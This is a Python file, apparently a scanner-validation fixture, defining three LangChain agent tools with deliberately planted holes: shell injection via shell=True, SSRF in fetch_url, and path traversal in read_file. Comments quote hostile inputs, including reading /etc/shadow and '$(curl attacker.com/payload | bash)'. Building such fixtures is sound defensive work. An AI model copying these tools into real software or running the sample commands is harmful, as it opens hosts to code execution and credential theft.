"""
Agent tool definitions.

SECURITY FIXTURE — This file contains deliberately insecure tool implementations
for use as a Trent scan validation fixture. Do NOT use this code in production.

Planted findings (application tier):
  VULN-APP-001: run_shell — RCE via shell=True with user-supplied command string
  VULN-APP-002: fetch_url — SSRF via user-supplied URL with no allowlist or redirect cap
  VULN-APP-003: read_file — path traversal via user-supplied path with no sandbox
"""

import subprocess
import urllib.request
from langchain_core.tools import tool


@tool
def read_file(path: str) -> str:
    """Read the contents of a file at the given path and return them as a string.

    Args:
        path: Filesystem path to read. Relative or absolute.
    """
    # VULN-APP-003: No path validation. The caller can supply "../../../etc/passwd"
    # or any other path on the host filesystem. There is no chroot, no allow-list,
    # and no check that the path stays within the intended working directory.
    with open(path, "r") as f:
        return f.read()


@tool
def run_shell(command: str) -> str:
    """Run a shell command and return its combined stdout+stderr output.

    Args:
        command: The shell command to execute.
    """
    # VULN-APP-001: shell=True passes the command string to /bin/sh verbatim.
    # A caller supplying "ls; cat /etc/shadow" or "$(curl attacker.com/payload | bash)"
    # gets arbitrary code execution on the host.
    result = subprocess.run(
        command,
        shell=True,
        capture_output=True,
        text=True,
        timeout=30,
    )
    return result.stdout + result.stderr


@tool
def fetch_url(url: str) -> str:
    """Fetch the contents of a URL and return the response body as a string.

    Args:
        url: The URL to fetch. HTTP and HTTPS are supported.
    """
    # VULN-APP-002: No URL allowlist, no redirect cap, no IP range blocking.
    # An attacker can supply "http://169.254.169.254/latest/meta-data/" to reach
    # EC2 instance metadata, or "http://internal-service/" to reach services on
    # the agent's internal network (SSRF).
    with urllib.request.urlopen(url, timeout=10) as response:
        return response.read().decode("utf-8", errors="replace")


# Tool registry — the orchestrator binds all three tools.
ALL_TOOLS = [read_file, run_shell, fetch_url]

# Subset exposed to the sub-agent — intentionally excludes run_shell to limit
# blast radius, but fetch_url and read_file are still present (still risky).
SUB_AGENT_TOOLS = [read_file, fetch_url]
